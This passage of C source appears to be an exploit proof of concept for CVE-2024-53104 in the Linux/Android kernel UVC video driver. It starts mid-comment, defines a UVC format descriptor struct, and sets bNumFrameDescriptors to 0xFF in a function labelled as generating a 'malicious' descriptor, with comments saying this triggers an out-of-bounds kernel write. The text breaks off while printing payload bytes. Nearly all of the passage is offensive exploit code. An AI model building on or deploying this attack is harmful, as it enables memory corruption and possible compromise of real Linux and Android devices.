 * Targets: Linux/Android Kernel UVC Driver.
 * Exploit: Malformed UVC descriptors (e.g., Video Format Descriptors) 
 * trigger an out-of-bounds write during device enumeration.
 */

// Malicious UVC Video Format Descriptor
struct uvc_format_descriptor {
    uint8_t bLength;
    uint8_t bDescriptorType;
    uint8_t bDescriptorSubType;
    uint8_t bFormatIndex;
    uint8_t bNumFrameDescriptors;
    uint8_t guidFormat[16];
    uint8_t bBitsPerPixel;
    uint8_t bDefaultFrameIndex;
    uint8_t bAspectRatioX;
    uint8_t bAspectRatioY;
    uint8_t bmInterfaceFlags;
    uint8_t bCopyProtect;
} __attribute__((packed));

void generate_malicious_descriptor() {
    struct uvc_format_descriptor desc;
    memset(&desc, 0, sizeof(desc));

    desc.bLength = sizeof(desc);
    desc.bDescriptorType = 0x24;    // CS_INTERFACE
    desc.bDescriptorSubType = 0x04; // VS_FORMAT_UNCOMPRESSED

    // Malformed Trigger: Oversized bNumFrameDescriptors
    // This causes the driver to allocate a small buffer but write 
    // many frame descriptors into it, resulting in an OOB write.
    desc.bNumFrameDescriptors = 0xFF; 

    printf("[*] Generating Malicious UVC Descriptor (CVE-2024-53104)\n");
    printf("[*] Payload bytes: ");
    uint8_t *ptr = (uint8_t *)&desc;
